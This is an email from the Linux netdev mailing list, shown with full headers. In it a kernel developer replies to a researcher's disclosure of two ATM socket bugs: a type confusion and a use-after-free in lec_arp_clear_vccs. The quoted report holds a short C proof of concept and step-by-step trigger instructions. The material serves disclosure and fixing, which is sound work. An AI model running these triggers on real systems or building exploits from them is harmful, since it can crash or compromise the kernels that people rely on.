Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 0C1D31C0DE1
	for <lists+netdev@lfdr.de>; Fri,  1 May 2020 07:46:59 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1728191AbgEAFqz (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Fri, 1 May 2020 01:46:55 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:34936 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726452AbgEAFqz (ORCPT
        <rfc822;netdev@vger.kernel.org>); Fri, 1 May 2020 01:46:55 -0400
Received: from mail-ot1-x341.google.com (mail-ot1-x341.google.com [IPv6:2607:f8b0:4864:20::341])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id CEA53C035494
        for <netdev@vger.kernel.org>; Thu, 30 Apr 2020 22:46:53 -0700 (PDT)
Received: by mail-ot1-x341.google.com with SMTP id j26so1861382ots.0
        for <netdev@vger.kernel.org>; Thu, 30 Apr 2020 22:46:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=iRbS0UTvQ1dfjXbHAxLW1rWTwCA0DX3CP920Z2phvf4=;
        b=X65WjAjjRMKxLDlNWldF3GzgwewnG7qGsp+eAic59fxv/ExSOwvZcqEP32OCpYxkpt
         ZsjhQDUt65Ta/t9IVGvYdKk8Fcb568lGzQ44C8jdp3gMS12/n2GKWJzsU7RYmOh8R6lN
         WgBj4zC6SBHa9G34aaUOG5nCxqm2lQoalJpgflkm07z+lDytfhauaHwsFKzLGd7m2T0T
         Hsn1euC+sqlthSqnsSsz+qqbhwAYnZZXL0hUhEMEmY13D21MvklhYki0WyaADxHy0qOA
         75vzOPZIx6rZmQn2URVuIVvoWLjM7n5iWseH/2bbLOhV+D2AdgFTIvh363rD/cvfZ5nh
         VPIg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=iRbS0UTvQ1dfjXbHAxLW1rWTwCA0DX3CP920Z2phvf4=;
        b=JVPNScE9IYbXwyt+as97qq8L9EyP2bCIh/TdibngE7o89xp2AxcheOIJevO6yeMrsu
         hBcuzwWcO3QuCt2/UJFa8a2F5TTS2ZDR7nmIDg3gksckK8+vm+NAgRe7P/KwlSq1gX+K
         CJLGX328iHVgLQfbEC02F3/fuf0bjlC47/qFoGYCapvS6NLsmxgL6At31JJXNF22ty0U
         jPmPGpXCWjhaMoD2FFefcrS3kSxbTSdlvXolbIOLqdow7JSqNoOgvCqLxLQw7/hpxiet
         41m9fvHbcrHmosTixreHd1bdVyR1MSDOIwCMY/MUnOQ5Cjq6KNOMdfuG2XXhxGTYWEee
         GkLA==
X-Gm-Message-State: AGi0PuaOxtL9PXF0mfz8sOcAaVpkhgnyNDnMoIbbtOYTGrJCm+cBCuSv
        mq5BbRhOSzr86qdWLMHG6Usn+8tMscmg9CPvebo=
X-Google-Smtp-Source: APiQypJa4kR81cme5glN/AjHpszB6BRwFHFGH7kjJapQS56KiHZrAjiZ8I78ARARPoCTFl5GQ0J/LiGlC6f+XHozewk=
X-Received: by 2002:a9d:107:: with SMTP id 7mr2506351otu.48.1588312012967;
 Thu, 30 Apr 2020 22:46:52 -0700 (PDT)
MIME-Version: 1.0
References: <CAEn12o7mwN3CT_=kv7NHho7fz-E8jeJfM99ZWD4JVL2E_wm-6g@mail.gmail.com>
In-Reply-To: <CAEn12o7mwN3CT_=kv7NHho7fz-E8jeJfM99ZWD4JVL2E_wm-6g@mail.gmail.com>
From:   Cong Wang <xiyou.wangcong@gmail.com>
Date:   Thu, 30 Apr 2020 22:46:41 -0700
Message-ID: <CAM_iQpW8xBiZJ7RmYA=PmNgm1wFRFNCfx=7VCQp8bCi3ncDciA@mail.gmail.com>
Subject: Re: Two bugs report
To:     Gengming Liu <l.dmxcsnsbh@gmail.com>
Cc:     Linux Kernel Network Developers <netdev@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

On Mon, Apr 27, 2020 at 6:16 AM Gengming Liu <l.dmxcsnsbh@gmail.com> wrote:
>
> We found two security bugs in the linux kernel and here's the
> description of the bugs.
>
> 0.Build a testing environment
>   a. Set up Ubuntu 19.04 in Vmware workstation.
>   b. sudo apt install linux-image-5.0.0-21-generic.
>   c. Change the grub default boot entry to 5.0.0-21-generic. (see
> https://askubuntu.com/questions/100232/how-do-i-change-the-grub-boot-order)
> cat /proc/version. If it is as following, it means you succeed.
>
> "Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
> 8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
> 2019"
>
>   d. compile the poc by using gcc.
>   e. Excute poc by "sudo ./poc"
>   f. Use dmesg to check kernel message about crash.
>
> 1.atm_vcc_userback type confusion
>
> atm(AF_ATMSVC) socket's vcc->user_back can be treated as different
> types of structures.
>
> To trigger this bug it requires CAP_NET_ADMIN.(Use sudo ./poc)
>
> The PoC has been tested on Linux 5.0.0-21 with Vmware workstation.
> Proc version is:
> Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
> 8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
> 2019
>
> Poc:
> #include <linux/socket.h>
> #include <linux/atmdev.h>
> #include <linux/atmarp.h>
> #include <linux/atmlec.h>
> #include <linux/atmsvc.h>
> #include <linux/atmmpc.h>
> #include <linux/atmclip.h>
>
> int main(int argc, char const *argv[])
> {
> int fd;
> fd = socket(0x14,3,0);
> ioctl(fd,0x61d8, 0x17); //ATMMPC_CTRL
>
> unsigned long long arg = 1;
> ioctl(fd, 0x400261f2, &arg ); //ATM_SETBACKEND
> ioctl(fd, 0x61e2, 1 ); //ATMARP_MKIP
>
> char buffer[] =
> "\x21\x26\x27\xc2\xdd\x6e\x1c\x96\x6e\x6b\x1e\xbb\x04\x4f\x0e\x3a\x51\x07\x22\xec\x86\x57";
> setsockopt(fd,0xe0c7, 0x80, buffer,0x16);

What is this setsockopt() for? I don't connect it to user_back.

The ATM code checks for user_back before using, for example,

        if (cmd != ATM_SETBACKEND && atmvcc->push != pppoatm_push)
                return -ENOIOCTLCMD;



>
> return 0;
> }
>
> 2.use-after-free in lec_arp_clear_vccs.
>
> UAF object: struct atm_vcc *vcc
>
> vcc is a atm(AF_ATMSVC) socket.
>
> To trigger this bug:
>
> 1. Create vcc socket #A and #B
> 2. ioctl(ATMLEC_CTRL) to attach #A to lec device.
> 3. ioctl(ATMLEC_DATA) to attach #B to device's priv->lec_arp_empty_ones list
> 4. close socket #B
> 5. close vcc socket #A to call lec_arp_clear_vccs() to trigger UAF

Yeah, good catch. I have a fix for this, will send it out shortly.

Thanks for the report!
